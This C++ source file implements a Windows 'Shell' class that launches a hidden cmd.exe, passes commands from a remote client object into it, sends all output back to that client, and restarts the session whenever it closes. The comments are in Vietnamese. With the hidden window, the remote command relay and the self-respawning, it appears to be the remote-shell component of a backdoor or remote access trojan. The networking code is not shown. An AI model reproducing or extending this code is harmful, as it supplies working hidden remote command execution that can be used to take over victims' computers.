#include <windows.h>
#include <string>
#include <vector>
#include <thread>
#include <mutex>
#include <iostream>
#include <iomanip>
#include <chrono>
#include <functional>
#include "Shell.h"

#include <sstream>


static std::string BytesToHex(const std::vector<unsigned char>& bytes) {
    std::ostringstream oss;
    for (unsigned char b : bytes) {
        oss << std::hex << std::setw(2) << std::setfill('0') << (int)b;
    }
    return oss.str();
}

static bool Utf8ToOemBytes(const std::string& utf8, std::vector<unsigned char>& out) {
    if (utf8.empty()) return true;
    int wlen = MultiByteToWideChar(CP_UTF8, 0, utf8.data(), (int)utf8.size(), nullptr, 0);
    if (wlen == 0) return false;
    std::wstring wbuf(wlen, 0);
    MultiByteToWideChar(CP_UTF8, 0, utf8.data(), (int)utf8.size(), &wbuf[0], wlen);

    UINT oem = GetOEMCP();
    int olen = WideCharToMultiByte(oem, 0, wbuf.data(), wlen, nullptr, 0, nullptr, nullptr);
    if (olen == 0) return false;
    out.resize(olen);
    WideCharToMultiByte(oem, 0, wbuf.data(), wlen, (LPSTR)out.data(), olen, nullptr, nullptr);
    return true;
}


bool Shell::CreateSession() {
    DisposeProcessResources();

    _read.store(true);
    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(sa);
    sa.lpSecurityDescriptor = nullptr;
    sa.bInheritHandle = TRUE;

    if (!CreatePipe(&_hChildStd_IN_Rd, &_hChildStd_IN_Wr, &sa, 0)) return false;
    SetHandleInformation(_hChildStd_IN_Wr, HANDLE_FLAG_INHERIT, 0);

    if (!CreatePipe(&_hChildStd_OUT_Rd, &_hChildStd_OUT_Wr, &sa, 0)) return false;
    SetHandleInformation(_hChildStd_OUT_Rd, HANDLE_FLAG_INHERIT, 0);

    if (!CreatePipe(&_hChildStd_ERR_Rd, &_hChildStd_ERR_Wr, &sa, 0)) return false;
    SetHandleInformation(_hChildStd_ERR_Rd, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOA si;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags |= STARTF_USESTDHANDLES;
    si.hStdInput = _hChildStd_IN_Rd;
    si.hStdOutput = _hChildStd_OUT_Wr;
    si.hStdError = _hChildStd_ERR_Wr;

    // Tao lenh cmd voi code page OEM
    UINT oem = GetOEMCP();
    char cmdline[128];
    sprintf_s(cmdline, "cmd.exe /K CHCP %u", (unsigned)oem);

    PROCESS_INFORMATION pi;
    ZeroMemory(&pi, sizeof(pi));

    // Tao cmd.exe process
    BOOL ok = CreateProcessA(
        nullptr,
        cmdline,
        nullptr, nullptr,
        TRUE,
        CREATE_NO_WINDOW,
        nullptr,
        nullptr,
        &si,
        &pi
    );

    // Dong child-side handles
    CloseHandle(_hChildStd_IN_Rd);
    _hChildStd_IN_Rd = nullptr;
    CloseHandle(_hChildStd_OUT_Wr);
    _hChildStd_OUT_Wr = nullptr;
    CloseHandle(_hChildStd_ERR_Wr);
    _hChildStd_ERR_Wr = nullptr;

    if (!ok) {
        std::cerr << "CreateProcess failed: " << GetLastError() << "\n";
        return false;
    }

    _procInfo = pi;

    _outThread = std::thread(&Shell::RedirectReadThread, this, _hChildStd_OUT_Rd, false);
    _errThread = std::thread(&Shell::RedirectReadThread, this, _hChildStd_ERR_Rd, true);

    return true;
}

bool Shell::ExecuteCommand(const std::string& commandUtf8) {
    std::lock_guard<std::mutex> lk(_stdinMutex);
    if (!IsProcessAlive()) {
        if (!CreateSession()) {
            if (_client) {
                std::string err = "\n>> Failed to creation shell session\n";
                _client->Send(err, true);
            }
            return false;
        }
    }

    // Chuyen doi UTF-8 sang OEM encoding
    std::vector<unsigned char> oemBytes;
    if (!Utf8ToOemBytes(commandUtf8, oemBytes)) {
        if (_client) _client->Send(commandUtf8, true);
        return false;
    }
    
    oemBytes.push_back('\r');
    oemBytes.push_back('\n');

    DWORD written = 0;
    BOOL ok = WriteFile(_hChildStd_IN_Wr, oemBytes.data(), (DWORD)oemBytes.size(), &written, nullptr);
    if (!ok) {
        if (_client) {
            std::string err = "\n>> Failed to write to stdin\n";
            _client->Send(err, true);
        }
        return false;
    }

    return true;
}

void Shell::RedirectReadThread(HANDLE pipeRead, bool isError) {
    if (!pipeRead) return;
    const DWORD bufSize = 4096;
    unsigned char buffer[bufSize];
    std::vector<unsigned char> acc;
    auto lastDataTime = std::chrono::steady_clock::now();
    const int flushTimeoutMs = 300;

    while (_read.load()) {
        if (!IsProcessAlive()) {
            if (_client) {
                std::string msg = "\n>> Session unexpectedly closed\n";
                _client->Send(msg, true);
            }

            std::this_thread::sleep_for(std::chrono::seconds(1));
            if (!CreateSession()) {
                std::this_thread::sleep_for(std::chrono::seconds(1));
                continue;
            } else {
                return;
            }
        }

        DWORD bytesRead = 0;
        BOOL ok = ReadFile(pipeRead, buffer, bufSize, &bytesRead, nullptr);
        if (!ok || bytesRead == 0) {
            auto now = std::chrono::steady_clock::now();
            auto elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(now - lastDataTime).count();
            
            if (!acc.empty() && elapsed > flushTimeoutMs) {
                if (_client) {
                    _client->Send(std::string(acc.begin(), acc.end()), isError);
                }
                acc.clear();
            }
            
            std::this_thread::sleep_for(std::chrono::milliseconds(50));
            continue;
        }

        lastDataTime = std::chrono::steady_clock::now();
        bool hasPrompt = false;

        for (DWORD i = 0; i < bytesRead; ++i) {
            unsigned char b = buffer[i];
            acc.push_back(b);
            
            if (b == '>') {
                hasPrompt = true;
            }
            
            if (b == '\n') {
                if (_client) {
                    _client->Send(std::string(acc.begin(), acc.end()), isError);
                }
                acc.clear();
                lastDataTime = std::chrono::steady_clock::now();
                hasPrompt = false;
            }
        }
        
        if (hasPrompt && !acc.empty()) {
            std::this_thread::sleep_for(std::chrono::milliseconds(100));
            if (_client) {
                _client->Send(std::string(acc.begin(), acc.end()), isError);
            }
            acc.clear();
            lastDataTime = std::chrono::steady_clock::now();
        }
    }

    if (!acc.empty() && _client) {
        _client->Send(std::string(acc.begin(), acc.end()), isError);
        acc.clear();
    }
}

bool Shell::IsProcessAlive() {
    if (_procInfo.hProcess == nullptr) return false;
    DWORD code;
    if (GetExitCodeProcess(_procInfo.hProcess, &code)) {
        return (code == STILL_ACTIVE);
    }
    return false;
}

void Shell::DisposeProcessResources() {
    // Dung tat ca threads
    _read.store(false);

    // Dong stdin handle
    if (_hChildStd_IN_Wr) {
        CloseHandle(_hChildStd_IN_Wr);
        _hChildStd_IN_Wr = nullptr;
    }
    // Dong read pipes
    if (_hChildStd_OUT_Rd) {
        CloseHandle(_hChildStd_OUT_Rd);
        _hChildStd_OUT_Rd = nullptr;
    }
    if (_hChildStd_ERR_Rd) {
        CloseHandle(_hChildStd_ERR_Rd);
        _hChildStd_ERR_Rd = nullptr;
    }

    // Ket thuc process neu con song
    if (_procInfo.hProcess) {
        DWORD code = 0;
        if (GetExitCodeProcess(_procInfo.hProcess, &code) && code == STILL_ACTIVE) {
            TerminateProcess(_procInfo.hProcess, 1);
        }
    }

    if (_procInfo.hThread) {
        CloseHandle(_procInfo.hThread);
        _procInfo.hThread = nullptr;
    }
    if (_procInfo.hProcess) {
        CloseHandle(_procInfo.hProcess);
        _procInfo.hProcess = nullptr;
    }

    // Cho threads ket thuc
    if (_outThread.joinable()) {
        _outThread.join();
    }
    if (_errThread.joinable()) {
        _errThread.join();
    }
}
